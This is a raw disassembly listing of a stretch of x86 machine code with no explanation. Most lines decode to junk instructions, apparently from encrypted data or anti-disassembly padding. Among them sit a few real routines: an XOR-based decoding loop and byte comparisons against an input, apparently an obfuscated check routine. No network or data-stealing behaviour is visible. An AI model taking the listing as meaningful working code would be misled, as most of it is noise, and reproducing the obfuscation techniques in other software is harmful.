  4031f1:	(bad)  
  4031f2:	xor    BYTE PTR [esi-0x41],dl
  4031f5:	hlt    
  4031f6:	das    
  4031f7:	xchg   edx,eax
  4031f8:	fistp  QWORD PTR [ebx+esi*2]
  4031fb:	mov    WORD PTR [ebx],es
  4031fd:	xor    BYTE PTR [ebx],bl
  4031ff:	jno    0x403229
  403201:	std    
  403202:	push   ss
  403203:	js     0x4031c7
  403205:	out    dx,eax
  403206:	es dec edi
  403208:	(bad)  
  403209:	sub    al,0x14
  40320b:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403212:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  403219:	or     DWORD PTR ds:0x42edef,ecx
  40321f:	mov    eax,DWORD PTR [ebp-0x8]
  403222:	movzx  ecx,WORD PTR ds:0x42edcb
  403229:	adc    DWORD PTR ds:0x4304d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e7c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430461,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	clc    
  40325d:	bound  eax,QWORD PTR [ecx+edx*8]
  403260:	rcl    BYTE PTR [esi],cl
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x403248
  403269:	dec    ebx
  40326a:	je     0x40323d
  40326c:	mov    ebx,0x6ce0a07
  403271:	scas   eax,DWORD PTR es:[edi]
  403272:	rcr    ch,cl
  403274:	and    ebp,DWORD PTR [edx]
  403276:	pop    eax
  403277:	std    
  403278:	pop    ss
  403279:	lods   al,BYTE PTR ds:[esi]
  40327a:	popa   
  40327b:	pushf  
  40327c:	xchg   DWORD PTR [eax],eax
  40327e:	sbb    DWORD PTR [ebx+ebx*1],0xffffffec
  403282:	addr16 cwde 
  403284:	bound  esi,QWORD PTR [ecx]
  403286:	inc    eax
  403287:	jge    0x40326b
  403289:	adc    al,0x30
  40328b:	outs   dx,BYTE PTR ds:[esi]
  40328c:	ins    BYTE PTR es:[edi],dx
  40328d:	fcomp  DWORD PTR [ebx+0x6a94637d]
  403293:	mov    edx,0x3e7a9705
  403298:	and    BYTE PTR [eax+0x637697c0],al
  40329e:	test   DWORD PTR [ecx+0x9ef1d0b],edi
  4032a4:	jg     0x403251
  4032a6:	or     ch,bh
  4032a8:	mov    ebp,0xfbb6265
  4032ad:	sbb    BYTE PTR [esi-0x65],dh
  4032b0:	mov    al,0xf4
  4032b2:	or     dl,BYTE PTR [ebp+0x616f6355]
  4032b8:	cmp    al,0xf3
  4032ba:	jmp    0x2ed353c1
  4032bf:	mov    edx,esp
  4032c1:	add    al,0x79
  4032c3:	add    BYTE PTR [edx+edi*8-0x1c4606ce],dl
  4032ca:	push   esi
  4032cb:	fdivr  QWORD PTR [ecx]
  4032cd:	add    al,0x78
  4032cf:	ret    
  4032d0:	mov    esp,0xf43f8407
  4032d5:	push   ss
  4032d6:	mov    ebx,ebx
  4032d8:	mov    ch,0x74
  4032da:	dec    esp
  4032db:	mov    al,0xb7
  4032de:	mov    bh,0x86
  4032e0:	sub    ah,al
  4032e2:	gs xor al,0xa5
  4032e5:	mov    dh,0x67
  4032e7:	inc    edi
  4032e8:	xchg   ebp,edx
  4032ea:	jmp    0x2abe:0x39daf503
  4032f1:	js     0x403284
  4032f3:	shl    DWORD PTR [esi-0x4ae52ac2],0x3c
  4032fa:	or     bh,BYTE PTR [edi]
  4032fc:	(bad)  
  4032fd:	pop    esp
  4032fe:	repnz shl dh,cl
  403301:	stc    
  403302:	lock jae 0x403380
  403305:	dec    edi
  403306:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403307:	dec    esp
  403308:	inc    ebx
  403309:	sub    BYTE PTR [ecx-0x690206b1],0xc3
  403310:	stos   DWORD PTR es:[edi],eax
  403311:	cmp    eax,0x382cfe1
  403316:	test   al,0xd8
  403318:	mov    edx,0x942eee7
  40331d:	push   cs
  40331e:	jge    0x40339a
  403320:	clc    
  403321:	mov    bh,0x85
  403323:	cld    
  403324:	xchg   DWORD PTR [esi-0x453e5bb6],edx
  40332a:	adc    eax,0xe23672f9
  40332f:	shl    BYTE PTR [eax+0x2fc2bcb9],0x1
  403336:	mov    DWORD PTR [edx],ebp
  403338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403339:	mov    esi,0xd3d1fc67
  40333e:	xchg   esp,eax
  40333f:	test   BYTE PTR [ecx+0x51751cb0],bh
  403345:	sahf   
  403346:	jo     0x4032c9
  403348:	sub    bh,BYTE PTR [ebx]
  40334a:	out    dx,al
  40334b:	enter  0x7268,0xd7
  40334f:	xlat   BYTE PTR ds:[ebx]
  403350:	rcl    ecx,1
  403352:	mov    WORD PTR [ecx],?
  403354:	mov    DWORD PTR [eax],esi
  403356:	aad    0xab
  403358:	cmc    
  403359:	data16 aad 0x3e
  40335c:	push   esp
  40335d:	adc    BYTE PTR [edx-0x19],ah
  403360:	mov    DWORD PTR [esi],edx
  403362:	jnp    0x403386
  403364:	jg     0x403393
  403366:	mov    edx,0x454dd2c8
  40336b:	mov    edi,0x8901b244
  403370:	mov    esp,0x282bd4a2
  403375:	mov    ecx,0x9b349761
  40337a:	test   BYTE PTR [edi],bl
  40337c:	xchg   ecx,eax
  40337d:	and    cl,BYTE PTR [ebp+0x63b6597b]
  403383:	add    eax,0xa11995fc
  403388:	jmp    0x2e7b:0x3960cdfd
  40338f:	lahf   
  403390:	jae    0x4033df
  403392:	jmp    eax
  403394:	int    0x39
  403396:	sub    al,0x2d
  403398:	sub    ebx,esi
  40339a:	test   BYTE PTR [edx+0x2f],dl
  40339d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40339e:	push   ebx
  40339f:	mov    eax,ds:0xdf021ecc
  4033a4:	lock dec ecx
  4033a6:	fild   QWORD PTR [esi+edi*2-0x3440e364]
  4033ad:	call   0x52e:0x3a51d1c4
  4033b4:	fst    DWORD PTR [ebx-0x7]
  4033b7:	pop    es
  4033b8:	push   eax
  4033b9:	sti    
  4033ba:	cli    
  4033bb:	(bad)  
  4033bd:	pop    eax
  4033be:	dec    ebp
  4033bf:	inc    esi
  4033c0:	sub    esi,DWORD PTR [edx]
  4033c2:	fidivr WORD PTR [ecx+0x58]
  4033c5:	jo     0x403399
  4033c7:	sar    BYTE PTR [edx],1
  4033c9:	jmp    0xe61a:0x4414aeae
  4033d0:	in     al,0x25
  4033d2:	pushf  
  4033d3:	inc    ebx
  4033d4:	jmp    0xef74:0x166e6763
  4033db:	jne    0x4033b7
  4033dd:	and    cl,bl
  4033df:	in     eax,0xac
  4033e1:	mov    al,0xb0
  4033e3:	xor    eax,0xf0d5f607
  4033e8:	add    al,0xa2
  4033ea:	retf   0x4876
  4033ed:	es sbb al,0xba
  4033f0:	push   esp
  4033f1:	jnp    0x4033ed
  4033f3:	push   es
  4033f4:	stos   BYTE PTR es:[edi],al
  4033f5:	out    dx,eax
  4033f6:	mov    ds:0x9915017b,al
  4033fb:	xchg   ebx,eax
  4033fc:	or     dh,BYTE PTR [edi]
  4033fe:	push   eax
  4033ff:	xchg   esp,eax
  403400:	call   0x38556c2d
  403405:	or     DWORD PTR [esi-0x1b7bfd6b],0xa1685b11
  40340f:	nop
  403410:	sub    al,0x1e
  403412:	shl    DWORD PTR [esi+0x2dfb1906],cl
  403418:	mov    esi,0x32729b
  40341d:	neg    DWORD PTR ds:0x430459
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	imul   eax,ebp,0x47
  403455:	add    eax,DWORD PTR [edx]
  403457:	adc    al,0x7e
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x403479
  40345f:	mov    ecx,0xd7d85e83
  403464:	jmp    0x1e153004
  403469:	aas    
  40346a:	inc    ebx
  40346b:	sub    eax,0x4e66574e
  403470:	pop    es
  403471:	pop    ebx
  403472:	js     0x4033fc
  403474:	jns    0x403491
  403476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403477:	mov    esi,0x9dd0ab8e
  40347c:	aas    
  40347d:	std    
  40347e:	mov    ebx,0x99ea1a12
  403483:	ficom  WORD PTR [ebp+0x6b]
  403486:	xchg   esi,eax
  403487:	cli    
  403488:	ret    
  403489:	xor    DWORD PTR [ecx-0x5e9a1b7a],esp
  40348f:	je     0x40344f
  403491:	mov    ds:0x7f39c9de,eax
  403496:	call   0xbd98ccb9
  40349b:	xor    DWORD PTR [ebx+0x57e9db6],0x130c2302
  4034a5:	dec    edi
  4034a6:	mov    ds:0x978dc8d8,eax
  4034ab:	and    esp,DWORD PTR [ecx+ebx*1+0x3f]
  4034af:	clc    
  4034b0:	mov    ebp,0x662b377d
  4034b5:	test   ebp,0x6a1d03dc
  4034bb:	inc    eax
  4034bc:	out    0xd0,eax
  4034be:	jb     0x403516
  4034c0:	ss jo  0x4034ee
  4034c3:	inc    ebx
  4034c4:	pop    ebp
  4034c5:	and    al,0xc3
  4034c7:	push   ds
  4034c8:	ja     0x403491
  4034ca:	mov    ds:0x9c06bf67,al
  4034cf:	dec    edi
  4034d0:	call   0x3a982443
  4034d5:	popf   
  4034d6:	stc    
  4034d7:	mov    ecx,0x55b32c4d
  4034dc:	aam    0x33
  4034de:	mov    ah,0x62
  4034e0:	push   0xb6e54d97
  4034e5:	jg     0x403507
  4034e7:	sbb    al,BYTE PTR [edx+0x34]
  4034ea:	inc    eax
  4034eb:	je     0x403472
  4034ed:	sub    edi,DWORD PTR [esi-0x50b6e2c1]
  4034f3:	call   0x11cf:0xbe3f5bd8
  4034fa:	(bad)  
  4034fb:	pop    edx
  4034fc:	push   ecx
  4034fd:	inc    ecx
  4034fe:	adc    ebp,DWORD PTR [eax+0x21]
  403501:	add    dh,BYTE PTR [ebx-0xe]
  403504:	call   0xc2019c10
  403509:	inc    edi
  40350a:	jge    0x40348f
  40350c:	inc    esi
  40350d:	les    edi,FWORD PTR [ebp+0x7e]
  403510:	mov    al,0x7e
  403512:	ret    0x465a
  403515:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403517:	and    al,0x45
  403519:	and    DWORD PTR [ebx+ebx*2+0x31],esi
  40351d:	add    al,BYTE PTR ds:0xa3db6e67
  403523:	pop    eax
  403524:	jecxz  0x403536
  403526:	ds repz jle 0x4034bd
  40352a:	int3   
  40352b:	cmp    BYTE PTR [ebp-0x651ceab3],ah
  403531:	sub    BYTE PTR [ecx],al
  403533:	cmp    eax,0xa96eeeb5
  403538:	push   ds
  403539:	(bad)  
  40353a:	aad    0x53
  40353c:	adc    DWORD PTR [ebx+0x16],edx
  40353f:	xchg   DWORD PTR [eax],eax
  403541:	(bad)  
  403542:	pop    ecx
  403543:	in     al,dx
  403544:	mov    dh,BYTE PTR [ebx]
  403546:	mov    DWORD PTR ds:0xd832acfb,edx
  40354c:	xchg   BYTE PTR [ecx+edx*1+0x50aef71b],dh
  403553:	mov    DWORD PTR [esi-0x187f0f5b],ebp
  403559:	ins    DWORD PTR es:[edi],dx
  40355a:	xlat   BYTE PTR ds:[ebx]
  40355b:	ficom  WORD PTR [edx+0x44]
  40355e:	jle    0x403522
  403560:	dec    ebp
  403561:	jno    0x403515
  403563:	ror    DWORD PTR [ecx],1
  403565:	mov    ch,0x81
  403567:	out    0x1,al
  403569:	and    DWORD PTR [ebx-0x1b],esp
  40356c:	dec    esi
  40356d:	cmp    DWORD PTR [eax+0x2f],0x58a65d8b
  403574:	xlat   BYTE PTR ds:[ebx]
  403575:	bound  ecx,QWORD PTR [esi-0x3ad870bc]
  40357b:	fisttp WORD PTR [ebp-0x26]
  40357e:	out    dx,eax
  40357f:	dec    eax
  403580:	cli    
  403581:	cpuid  
  403583:	sbb    al,0xe1
  403585:	(bad)  
  403586:	mov    edi,0x9b7037f9
  40358b:	sbb    edx,edx
  40358d:	ret    0x49c5
  403590:	add    DWORD PTR [edi+edi*2+0x45ba4352],edi
  403597:	cli    
  403598:	adc    bl,BYTE PTR [ebp+0x29]
  40359b:	push   cs
  40359c:	cmp    eax,0xf368f0cb
  4035a1:	jo     0x403530
  4035a3:	xor    ch,BYTE PTR [ebx+edi*8]
  4035a6:	mov    dh,0x54
  4035a8:	icebp  
  4035a9:	and    eax,0xfd684ed5
  4035ae:	mov    esi,0x8fc51002
  4035b3:	dec    ecx
  4035b4:	mov    bh,0xd3
  4035b6:	rol    ch,cl
  4035b8:	and    ecx,DWORD PTR [ebp-0x1e201e89]
  4035be:	jmp    0x4035a0
  4035c0:	add    edi,DWORD PTR [ebp-0x5f]
  4035c3:	cmp    al,0x63
  4035c5:	fcmovnbe st,st(5)
  4035c7:	outs   dx,BYTE PTR ds:[esi]
  4035c8:	jno    0x403578
  4035ca:	add    DWORD PTR [eax+edx*2+0x5b],ebp
  4035ce:	inc    ecx
  4035cf:	je     0x4035f3
  4035d1:	hlt    
  4035d2:	retf   0x9655
  4035d5:	mov    dh,0x13
  4035d7:	dec    esp
  4035d8:	cwde   
  4035d9:	push   cs
  4035da:	adc    DWORD PTR [ecx+0x2d96e783],esp
  4035e0:	add    ebx,esp
  4035e2:	adc    DWORD PTR ds:0xc7840f90,0xa7aec71f
  4035ec:	call   0x30f0:0xa379a590
  4035f3:	sub    ecx,esp
  4035f5:	sbb    BYTE PTR [ebp-0x29dea6c4],0xe
  4035fc:	in     al,0x89
  4035fe:	cmc    
  4035ff:	xlat   BYTE PTR ds:[ebx]
  403600:	mov    edi,0x2f178127
  403605:	add    al,0x87
  403607:	sub    edx,DWORD PTR ds:0x8fe66f21
  40360d:	cmp    DWORD PTR [ebx],esi
  40360f:	rol    DWORD PTR [ebx],1
  403611:	(bad)  
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x123dd7c8
  40366f:	sbb    DWORD PTR [eax+0x6d],edx
  403672:	mov    dl,0x15
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x4036e5
  40367b:	adc    DWORD PTR ds:0x5e4b7ab6,0x8e835e21
  403685:	adc    al,0xe9
  403687:	add    ebp,esp
  403689:	cmp    eax,0x3988138b
  40368e:	pop    ecx
  40368f:	pop    eax
  403690:	push   es
  403691:	imul   BYTE PTR [esi]
  403693:	pop    ss
  403694:	push   es
  403695:	dec    esp
  403696:	icebp  
  403697:	retf   0x2f28
  40369a:	mov    WORD PTR [esi+0x1e],?
  40369d:	loope  0x4036ab
  40369f:	push   edx
  4036a0:	std    
  4036a1:	xlat   BYTE PTR ds:[ebx]
  4036a2:	push   0xffffffb6
  4036a4:	gs mov ch,0x4f
  4036a7:	call   0x46d7:0xd44c9aa8
  4036ae:	add    eax,0x631b98df
  4036b3:	push   es
  4036b4:	push   esp
  4036b5:	dec    edi
  4036b6:	inc    esp
  4036b7:	mov    al,0x50
  4036b9:	pop    ss
  4036ba:	xor    ch,BYTE PTR [edx-0x76]
  4036bd:	push   cs
  4036be:	sbb    ch,ah
  4036c0:	sbb    eax,0xe988ec4d
  4036c5:	xchg   edx,eax
  4036c6:	xchg   ecx,eax
  4036c7:	inc    eax
  4036c8:	sub    DWORD PTR [edx-0x53694b73],0x8b57a670
  4036d2:	jg     0x403702
  4036d4:	mov    ah,0xb9
  4036d6:	imul   edi,DWORD PTR [esi+ebp*1-0x2fe78e2c],0x7c035063
  4036e1:	sahf   
  4036e2:	outs   dx,DWORD PTR ds:[esi]
  4036e3:	sbb    eax,0x7fbf61cc
  4036e8:	cmp    DWORD PTR [eax-0x13],edi
  4036eb:	sbb    BYTE PTR [ebp-0x3a9c963b],dl
  4036f1:	test   eax,0xca6c32bb
  4036f6:	data16 test BYTE PTR [ecx-0x7c],cl
  4036fa:	sahf   
  4036fb:	mov    edx,0xcb5541c4
  403700:	popa   
  403701:	or     bh,BYTE PTR [eax-0x6b]
  403704:	jp     0x403736
  403706:	xchg   BYTE PTR [edx+0x47],bl
  403709:	loope  0x40373a
  40370b:	mov    edx,0x56b121ee
  403710:	cmc    
  403711:	or     al,BYTE PTR [edi]
  403713:	loop   0x403751
  403715:	or     esi,esp
  403717:	xchg   edx,eax
  403718:	xchg   ebx,eax
  403719:	push   edi
  40371a:	adc    DWORD PTR [esi-0x74],0x32b8d0f8
  403721:	cmp    BYTE PTR [edx],bl
  403723:	cmc    
  403724:	and    BYTE PTR [esi],dh
  403726:	add    dl,BYTE PTR [ebx-0x28]
  403729:	ja     0x403798
  40372b:	daa    
  40372c:	sbb    BYTE PTR [eax-0x3c],bl
  40372f:	call   0x2146:0x8d2b1b4e
  403736:	mov    esp,DWORD PTR [ecx]
  403738:	mov    dh,0xb6
  40373a:	daa    
  40373b:	pop    ecx
  40373c:	fld    TBYTE PTR [ecx-0x50d6aaef]
  403742:	retf   
  403743:	(bad)  
  403744:	sar    DWORD PTR [ebp+0x1f],cl
  403747:	and    al,0x68
  403749:	int3   
  40374a:	push   0x1a
  40374c:	mov    ebx,0xc838d6ea
  403751:	(bad)  
  403752:	mov    DWORD PTR [edx],0xf5f6cec4
  403758:	clc    
  403759:	mov    al,ds:0x36ee877f
  40375e:	loop   0x4037bc
  403760:	sbb    eax,0x981df16e
  403765:	aaa    
  403766:	xchg   esp,eax
  403767:	and    al,0xd6
  403769:	mov    eax,0x28b934da
  40376e:	daa    
  40376f:	adc    eax,0x1cc4912a
  403774:	jo     0x403718
  403776:	ins    DWORD PTR es:[edi],dx
  403777:	aas    
  403778:	fld    TBYTE PTR ds:0xdb96a708
  40377e:	mov    esi,0x6fcf17f3
  403783:	comiss xmm4,DWORD PTR [ebp+0x15]
  403787:	jp     0x403750
  403789:	ins    DWORD PTR es:[edi],dx
  40378a:	adc    bl,ch
  40378c:	pusha  
  40378d:	cmp    cl,BYTE PTR [ebp+0x5e]
  403790:	mov    eax,0xe73c3344
  403795:	mov    ah,0xd6
  403797:	mov    eax,0x5bd92b2a
  40379c:	jbe    0x40379d
  40379e:	and    ebx,DWORD PTR [esi-0x7c]
  4037a1:	call   FWORD PTR [ecx+0x15]
  4037a4:	cmp    bh,dl
  4037a6:	fcomp  DWORD PTR [edx+ebp*1]
  4037a9:	test   dl,ah
  4037ab:	fild   QWORD PTR [ecx]
  4037ad:	scas   eax,DWORD PTR es:[edi]
  4037ae:	or     BYTE PTR [ecx+0x274017bd],0xe6
  4037b5:	and    DWORD PTR [eax],edi
  4037b7:	mov    esp,0x2ceae1bb
  4037bc:	push   cs
  4037bd:	hlt    
  4037be:	daa    
  4037bf:	loopne 0x403815
  4037c1:	icebp  
  4037c2:	xchg   esi,eax
  4037c3:	sub    al,0x86
  4037c5:	and    BYTE PTR [edi-0x14],cl
  4037c8:	push   0x301f5f89
  4037cd:	pop    esp
  4037ce:	rol    BYTE PTR [esi],1
  4037d0:	stc    
  4037d1:	jmp    0x403833
  4037d3:	aaa    
  4037d4:	arpl   si,bp
  4037d6:	aaa    
  4037d7:	cmp    esp,ebx
  4037d9:	lock push ecx
  4037db:	div    DWORD PTR [edx]
  4037dd:	inc    eax
  4037de:	sbb    BYTE PTR ds:[ecx],bh
  4037e1:	push   edx
  4037e2:	xor    ch,BYTE PTR [ebx+0x65]
  4037e5:	ret    
  4037e6:	in     al,0xb6
  4037e8:	pop    edi
  4037e9:	or     eax,0xaae7f2ab
  4037ee:	jns    0x40380a
  4037f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037f1:	push   ebp
  4037f2:	cld    
  4037f3:	push   ebp
  4037f4:	dec    ecx
  4037f5:	and    ecx,DWORD PTR [eax-0x70]
  4037f8:	mov    bh,BYTE PTR [esi+eiz*2+0x71ea167a]
  4037ff:	jmp    FWORD PTR [ecx+0x52]
  403802:	mov    ch,0xf8
  403804:	mov    al,0xa3
  403806:	add    eax,0x609c0644
  40380b:	and    ebp,edi
  40380d:	mov    edx,0x9a6d2632
  403812:	ret    
  403813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403815:	sbb    BYTE PTR ds:0xdcae7dbe,dl
  40381b:	lods   eax,DWORD PTR ds:[esi]
  40381c:	push   eax
  40381d:	mov    WORD PTR ds:0x8f1620ea,cs
  403823:	inc    esi
  403824:	and    BYTE PTR [ebp+0x66],ch
  403827:	mov    ds:0x558b35e6,al
  40382c:	adc    BYTE PTR [ebx],dh
  40382e:	rol    DWORD PTR [ebx],0xc6
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xe6426523
  403845:	add    esp,edx
  403847:	adc    edi,DWORD PTR [esi+0x7e]
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x403856
  40384f:	sbb    ch,cl
  403851:	sti    
  403852:	xchg   esi,eax
  403853:	jns    0x40387f
  403855:	in     al,dx
  403856:	fidivr WORD PTR ds:0x639e0fc3
  40385c:	xor    al,0x92
  40385e:	sbb    DWORD PTR [edi-0x6b],esp
  403861:	adc    DWORD PTR [edx+0x32eefec0],ebx
  403867:	dec    ebp
  403868:	xor    sp,WORD PTR [edx]
  40386b:	jae    0x403831
  40386d:	jg     0x4038c6
  40386f:	inc    eax
  403870:	lods   eax,DWORD PTR ds:[esi]
  403871:	push   eax
  403872:	dec    DWORD PTR [eax]
  403874:	jmp    0xde67e87d
  403879:	mov    BYTE PTR [esi-0x186ecedc],al
  40387f:	repz mov ecx,0x9766a8a8
  403885:	or     ecx,DWORD PTR [eax-0x3d]
  403888:	clc    
  403889:	imul   BYTE PTR [edx]
  40388b:	cdq    
  40388c:	cmp    DWORD PTR [eax],0xaff8732f
  403892:	xor    eax,0xf35559b3
  403897:	outs   dx,DWORD PTR ds:[esi]
  403898:	or     esi,DWORD PTR [ecx+ebp*8+0x408102fe]
  40389f:	sub    ebx,edx
  4038a1:	xchg   edx,eax
  4038a2:	pop    eax
  4038a3:	xor    dh,0xec
  4038a6:	xor    eax,0x7a7977c
  4038ab:	or     DWORD PTR ds:[edx-0x32bdff2b],edx
  4038b2:	sbb    DWORD PTR [edx-0x15159909],edi
  4038b8:	mov    edi,0x451a7d07
  4038bd:	adc    esi,esp
  4038bf:	scas   al,BYTE PTR es:[edi]
  4038c0:	adc    eax,0x336ad127
  4038c5:	jns    0x40387f
  4038c7:	iret   
  4038c8:	adc    edx,edx
  4038ca:	mov    esi,0xab43cefa
  4038cf:	out    dx,eax
  4038d0:	mov    eax,ds:0xe7be681a
  4038d5:	mov    eax,0x4bf2a072
  4038da:	rcr    DWORD PTR [edi-0x3a59863d],cl
  4038e0:	sbb    eax,0x5b575ec3
  4038e5:	int3   
  4038e6:	mov    esp,gs
  4038e8:	fucomi st,st(7)
  4038ea:	mov    ch,0xf3
  4038ec:	loopne 0x4038be
  4038ee:	fmul   DWORD PTR [ecx]
  4038f0:	call   0x404:0xd11f7185
  4038f7:	shl    DWORD PTR [edi+0x4a],0xbc
  4038fb:	gs sub dh,bh
  4038fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038ff:	push   ecx
  403900:	loop   0x40396e
  403902:	(bad)  [ecx]
  403904:	cs cld 
  403906:	das    
  403907:	stos   BYTE PTR es:[edi],al
  403908:	hlt    
  403909:	je     0x40397c
  40390b:	push   ss
  40390c:	ds into 
  40390e:	push   es
  40390f:	jnp    0x4038ab
  403911:	add    edi,DWORD PTR [esi]
  403913:	das    
  403914:	out    0xde,eax
  403916:	xor    BYTE PTR [ebp-0x75],dl
  403919:	std    
  40391a:	jle    0x4038bc
  40391c:	pop    ecx
  40391d:	test   eax,0x5f980111
  403922:	and    dl,al
  403924:	xchg   ecx,eax
  403925:	jb     0x4038a7
  403927:	je     0x403923
  403929:	push   edi
  40392a:	jg     0x403924
  40392c:	clc    
  40392d:	retf   
  40392e:	shr    DWORD PTR [ebx+0x2a8e6951],0x9f
  403935:	dec    ebx
  403936:	leave  
  403937:	iret   
  403938:	sar    ah,0x60
  40393b:	jge    0x403982
  40393d:	adc    BYTE PTR [edx+0x3ef0b8f3],bh
  403943:	jne    0x403961
  403945:	inc    esp
  403946:	sbb    bh,cl
  403948:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403949:	add    eax,0x49ab24a9
  40394e:	add    bh,ch
  403950:	dec    eax
  403951:	popa   
  403952:	retf   
  403953:	stc    
  403954:	adc    DWORD PTR [edi+0x2523dbf5],ebx
  40395a:	test   eax,0x80eeff43
  40395f:	fwait
  403960:	xchg   ebp,eax
  403961:	ins    BYTE PTR es:[edi],dx
  403962:	addr16 jns 0x403963
  403965:	xor    al,BYTE PTR [ecx+0x10]
  403968:	in     al,0x8b
  40396a:	jle    0x4039c8
  40396c:	fwait
  40396d:	xchg   ebx,eax
  40396e:	or     ecx,DWORD PTR [ecx]
  403970:	fmul   DWORD PTR [esi+0x75]
  403973:	enter  0x52e4,0x8
  403977:	inc    ecx
  403978:	mov    ds:0x25942fb7,al
  40397d:	pop    esp
  40397e:	pop    edi
  40397f:	rep ins DWORD PTR es:[edi],dx
  403981:	lock xchg DWORD PTR es:[edi],eax
  403985:	pop    ecx
  403986:	push   ss
  403987:	stc    
  403988:	aad    0x52
  40398a:	adc    edi,eax
  40398c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40398d:	fwait
  40398e:	sub    esp,DWORD PTR [edx-0x52]
  403991:	pop    ebp
  403992:	jg     0x403982
  403994:	sub    BYTE PTR [esi],dl
  403996:	inc    ebx
  403997:	(bad)  
  403998:	pop    ebp
  403999:	icebp  
  40399a:	jge    0x4039d7
  40399c:	adc    eax,0x6da4d3ae
  4039a1:	(bad)  
  4039a2:	pop    esp
  4039a3:	(bad)  
  4039a4:	jge    0x4039f5
  4039a6:	lea    esp,[edi]
  4039a8:	popa   
  4039a9:	lock sbb ebx,edx
  4039ac:	popf   
  4039ad:	adc    al,0x7d
  4039af:	pop    esp
  4039b0:	xor    sp,cx
  4039b3:	es test eax,0x87133357
  4039b9:	or     al,0x99
  4039bb:	inc    edx
  4039bc:	scas   eax,DWORD PTR es:[di]
  4039be:	ret    
  4039bf:	or     ch,al
  4039c1:	enter  0x33cb,0x55
  4039c5:	ds jecxz 0x403970
  4039c8:	shr    al,0x74
  4039cb:	out    dx,eax
  4039cc:	jp     0x403958
  4039ce:	dec    ebx
  4039cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d0:	loope  0x403a0b
  4039d2:	mov    ah,0x48
  4039d4:	pop    ecx
  4039d5:	lods   al,BYTE PTR ds:[esi]
  4039d6:	cmp    BYTE PTR [eiz*2-0x592a6973],dh
  4039dd:	dec    ebp
  4039de:	push   ecx
  4039df:	les    edx,FWORD PTR ds:0x5238c5dc
  4039e5:	push   ebp
  4039e6:	xchg   esi,eax
  4039e7:	jno    0x403a09
  4039e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039ea:	lahf   
  4039eb:	xchg   ecx,eax
  4039ec:	lods   al,BYTE PTR ds:[esi]
  4039ed:	inc    ecx
  4039ee:	cld    
  4039ef:	sbb    DWORD PTR [edi+0x52],0xb5300baa
  4039f6:	sbb    BYTE PTR [ebp-0x6186e451],cl
  4039fc:	cmp    eax,0x8b0289aa
  403a01:	inc    ebp
  403a02:	clc    
  403a03:	xor    eax,ecx
  403a05:	add    eax,esi
  403a07:	mov    DWORD PTR [ebp+0x8],eax
  403a0a:	mov    eax,DWORD PTR [ebp+0x8]
  403a0d:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a11:	mov    dl,BYTE PTR [ebp-0x1]
  403a14:	cmp    al,dl
  403a16:	je     0x403fc0
  403a1c:	mov    eax,DWORD PTR [ebp+0x8]
  403a1f:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  403a23:	mov    edx,DWORD PTR [ebp+0xc]
  403a26:	cmp    al,BYTE PTR [edx]
  403a28:	jne    0x4041b3
  403a2e:	mov    eax,DWORD PTR [ebp-0x8]
